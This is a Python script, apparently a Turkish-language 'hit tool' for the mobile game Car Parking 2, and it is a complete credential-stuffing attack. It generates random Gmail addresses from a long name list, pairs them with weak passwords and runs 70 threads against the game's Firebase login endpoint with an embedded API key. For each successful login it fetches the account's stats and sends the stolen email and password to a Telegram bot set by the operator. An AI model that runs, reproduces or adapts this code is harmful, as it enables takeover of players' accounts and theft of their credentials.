import requests;import json;import threading;import random;import string
from cfonts import render;Y = '\033[92m';S = '\033[93m';K = '\033[31m';B = '\033[37m';G = '\033[1;30;40m';print(render('{Cpm}', colors=['white', 'blue'], align='center'));print(B + '\t\tCar Parking 2 Hit Tool | @Yenilgisiz');print('\n');id = int(input(S+"Id Gir:"+B));token = input(S+"Token Gir:"+B);hit = 0;kotu = 0;printlock = threading.Lock();statuslock = threading.Lock();url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
def tggonderbra(mail, sfre, araba, yariswin, driftmax):
    try:
        msg = f"""Cpm 2 Hit
Mail: {mail}
Şifre: {sfre}
Araba Sayisi: {araba}
Win Sayısı : {yariswin}
Max Drift Skoru : {driftmax}
Dev:@YeniIgisiz"""
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={msg}")
    except:
        pass
randomisim = [ 'ahmet', 'mehmet', 'ali', 'ayse', 'fatma', 'metin', 'hasan', 'busra',
        'melis', 'buse', 'muhammed', 'mesut', 'rasim', 'huseyin', 'seda',
        'tugce', 'esra', 'esma', 'esref', 'burhan', 'gizem', 'ecem', 'eslem',
        'ismail',"james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles",
    "christopher", "daniel", "matthew", "anthony", "mark", "donald", "steven", "paul", "andrew", "joshua",
    "kenneth", "kevin", "brian", "george", "timothy", "ronald", "edward", "jason", "jeffrey", "ryan",
    "jacob", "gary", "nicholas", "eric", "jonathan", "stephen", "larry", "justin", "scott", "brandon",
    "benjamin", "samuel", "gregory", "alexander", "frank", "patrick", "raymond", "jack", "dennis", "jerry",
    "tyler", "aaron", "jose", "adam", "nathan", "henry", "douglas", "zachary", "peter", "kyle",
    "walter", "ethan", "jeremy", "harold", "keith", "christian", "roger", "noah", "gerald", "carl",
    "terry", "sean", "austin", "arthur", "lawrence", "jesse", "dylan", "bryan", "joe", "jordan",
    "billy", "bruce", "albert", "willie", "gabriel", "logan", "alan", "juan", "wayne", "roy",
    "ralph", "randy", "eugene", "vincent", "russell", "louis", "philip", "bobby", "johnny", "bradley",
    "caleb", "ryan", "nathan", "isaac", "andrew", "christian", "hunter", "julian", "adrian", "christopher",
    "ezra", "hudson", "nolan", "cameron", "connor", "santiago", "dominic", "ian", "adam", "xavier",
    "jace", "everett", "declan", "evan", "kayden", "parker", "wesley", "kai", "chase", "cole",
    "diego", "luis", "carlos", "juan", "miguel", "angel", "antonio", "jorge", "alejandro", "fernando",
    "manuel", "ricardo", "francisco", "eduardo", "mario", "roberto", "pedro", "sergio", "marco", "leonardo",
    "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen",
    "quz", "nancy", "betty", "margaret", "sandra", "ashley", "kimberly", "emily", "donna", "michelle",
    "carol", "amanda", "dorothy", "melissa", "deborah", "stephanie", "rebecca", "sharon", "laura", "cynthia",
    "kathleen", "amy", "angela", "shirley", "anna", "brenda", "pamela", "emma", "nicole", "helena",
    "samantha", "katherine", "christine", "debra", "rachel", "carolyn", "janet", "catherine", "maria", "heather",
    "diane", "virginia", "julie", "joyce", "victoria", "olivia", "kelly", "christina", "lauren", "joan",
    "evelyn", "judith", "megan", "cheryle", "andrea", "hannah", "martha", "jacqueline", "frances", "gloria",
    "ann", "teresa", "kathryn", "sara", "janice", "jean", "alice", "madison", "doris", "abigail",
    "julia", "judy", "grace", "denise", "amber", "marilyn", "beverly", "danielle", "theresa", "sophia",
    "marie", "diana", "brittany", "natalie", "isabella", "charlotte", "rose", "alexis", "kayla", "chloe",
    "zoe", "mila", "eva", "harper", "evelyn", "scarlett", "camila", "penelope", "aria", "layla",
    "riley", "nora", "lily", "eleanor", "hazel", "violet", "aurora", "savannah", "audrey", "brooklyn",
    "bella", "claire", "skylar", "lucy", "paisley", "everly", "caroline", "nova", "genesis", "emilia",
    "kennedy", "willow", "kinsley", "naomi", "aaliyah", "elena", "maya", "luna", "stella", "ellie"
]
def ritos():
    global hit, kotu
    while True:
        am = random.randint(1, 6)
        mail = "".join(random.sample(string.ascii_lowercase + string.digits, am))
        bra = random.choice(randomisim)
        yrk = random.randint(1, 5)
        pas = random.choice(["123123", "123455", "123456", "1234567", "12345678",
                            "123456789", "1234567890", "000000", "111111"])
        quz = [
            f"{bra}{yrk}",
            f"{mail}",
            f"{bra}{bra}",
        ]
        lstt = random.choice(quz)
        gmail = f"{lstt}@gmail.com"
        password = random.choice(["123123", "123455", "123456", "1234567", "12345678",
                                  "123456789", "1234567890", "000000", "111111",
                                  "qwertyuiop", lstt])       #Yenilgisiz 
        try:
            payload = {
                "email": gmail,
                "password": password,
                "returnSecureToken": True,
                "clientType": "CLIENT_TYPE_ANDROID"
            }
            headers = {
                "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
                "Accept-Encoding": "deflate, gzip",
                "Content-Type": "application/json",
                "X-Unity-Version": "2022.3.62f2"
            }
            response = requests.post(url, json=payload, headers=headers).json()
        except:
            continue
        if "idToken" in response:
            hit += 1
            amsever = response["idToken"]
            bulluk = response.get("localId")
            capurl = "https://europe-west1-cpm-2-7cea1.cloudfunctions.net/GetUserRatingCall22_1"
            payload2 = {"data": bulluk}
            headers2 = {
                "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=utf-8",
                "Authorization": f"Bearer {amsever}",
                "X-Unity-Version": "2022.3.62f2"
            }
            try:
                purnacan = requests.post(capurl, data=json.dumps(payload2), headers=headers2)
                result = purnacan.json()
                araba = "N/A"
                yariswin = "N/A"
                driftmax = "N/A"
                if "result" in result:
                    data = json.loads(result["result"])
                    general = data.get("general", {})
                    araba = general.get("cars", "N/A")
                    yariswin = general.get("race_win", "N/A")
                    driftmax = general.get("drift_max", "N/A")
            except:
                araba = yariswin = driftmax = "Hata"
            with printlock:                
                print(Y+"HIT")
                print(S+f"Email: {B}{gmail}")
                print(S+f"Password: {B}{password}")
                print(S+f"Araba sayisi: {B}{araba}")
                print(S+f"Yaris Wins: {B}{yariswin}")
                print(S+f"Max Drift: {B}{driftmax}")
                print()
            tggonderbra(gmail, password, araba, yariswin, driftmax)
        else:
            kotu += 1
        with statuslock:
            print(f'''
{Y}HİT: {B}{hit} {B}| {K}KOTU: {B}{kotu}''')
for x in range(70):
    threading.Thread(target=ritos).start()
